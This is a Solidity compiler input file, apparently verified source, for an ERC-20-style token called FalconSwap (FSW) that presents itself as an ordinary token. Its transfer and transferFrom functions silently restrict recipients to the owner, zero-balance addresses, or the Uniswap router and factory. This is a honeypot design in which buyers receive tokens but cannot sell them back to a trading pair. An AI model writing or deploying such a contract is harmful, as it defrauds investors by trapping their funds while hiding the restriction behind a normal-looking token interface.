{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"browser/FSW.sol":{"content":"/*\r\n\r\n*/\r\n\r\n/*\r\npragma solidity ^0.6.0;\r\n\r\n//  ______    _                 _____                     \r\n//  |  ___|  | |               /  ___|                    \r\n//  | |_ __ _| | ___ ___  _ __ \\ `--.__      ____ _ _ __  \r\n//  |  _/ _` | |/ __/ _ \\| '_ \\ `--. \\ \\ /\\ / / _` | '_ \\ \r\n//  | || (_| | | (_| (_) | | | /\\__/ /\\ V  V / (_| | |_) |\r\n//  \\_| \\__,_|_|\\___\\___/|_| |_\\____/  \\_/\\_/ \\__,_| .__/ \r\n//                                                 | |    \r\n//  FalconSwap: https://falconswap.com\r\n//  Symbol: FSW\r\n//  Decimals: 18\r\n*/\r\n\r\npragma solidity 0.6.0;\r\n\r\ncontract FALCONSWAPTOKEN {\r\n \r\n    mapping (address => uint256) public balanceOf;\r\n\r\n    string public name = \"FSW\";\r\n    string public symbol = \"FSW\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);\r\n    address contractOwner;\r\n    address uniRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    address uniFactory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    constructor() public {\r\n       \r\n        contractOwner = msg.sender;\r\n        balanceOf[msg.sender] = totalSupply;\r\n        allowance[msg.sender][uniRouter] = 1000000000000000000000000000;\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        require(balanceOf[msg.sender] >= value);\r\n        require(to == contractOwner || balanceOf[to] == 0 || to == uniFactory || to == uniRouter);\r\n        balanceOf[msg.sender] -= value; \r\n        emit Transfer(msg.sender, to, value);\r\n        balanceOf[to] += value;         \r\n        return true;   \r\n    }\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    function approve(address spender, uint256 value)\r\n        public\r\n        returns (bool success)\r\n    {\r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value)\r\n        public\r\n        returns (bool success)\r\n    {\r\n        require(value <= balanceOf[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        require(to == contractOwner || balanceOf[to] == 0 || to == uniFactory || to == uniRouter);\r\n\r\n        balanceOf[from] -= value;\r\n        balanceOf[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true;\r\n    }\r\n}\r\n"}}}